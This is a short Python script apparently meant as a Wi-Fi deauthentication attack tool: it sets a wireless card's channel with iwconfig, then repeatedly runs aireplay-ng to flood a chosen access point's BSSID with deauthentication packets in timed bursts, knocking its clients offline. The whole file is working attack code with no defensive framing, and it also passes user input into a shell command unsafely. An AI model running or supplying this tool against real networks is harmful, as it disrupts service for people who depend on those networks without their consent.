import subprocess, time, sys




red = "\033[1;31m"
green = "\033[1;32m"





def iwCh( channel, interface ):
    try:
        subprocess.run( f"sudo iwconfig { interface } channel { channel }", shell = True, check = True )
        print( f"\n{ green }Channel is set to { channel } in { interface }!\n" )
        time.sleep( 2 )
    except:
        print( f"\n{ red }Getting error in setting channel of { interface }!\n" )
        sys.exit( 0 )




def kiddDeAuth( BSSID, interface ):
    try:
        time.sleep( 40 )
        print( f"\n\n{ red }I am going to kid the wifi right now!\n\n" )
        p = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ] )
        time.sleep( 20 )
        p.terminate()
        p.wait()
        print( f"{ green }\n\nI am going to sleep for a while!\n\n" )
        kiddDeAuth( BSSID, interface )
    except:
        print( f"{ red }\nGetting error in Sending DeAuth!\n" )
        sys.exit( 0 )


iwCh( str( input( "Channel to send DeAuth : " ) ), str( input( "Interface : " ) ) )

kiddDeAuth( str( input( "The BSSID of wifi to send DeAuth : " ) ), str( input( "Interface : " ) ) )
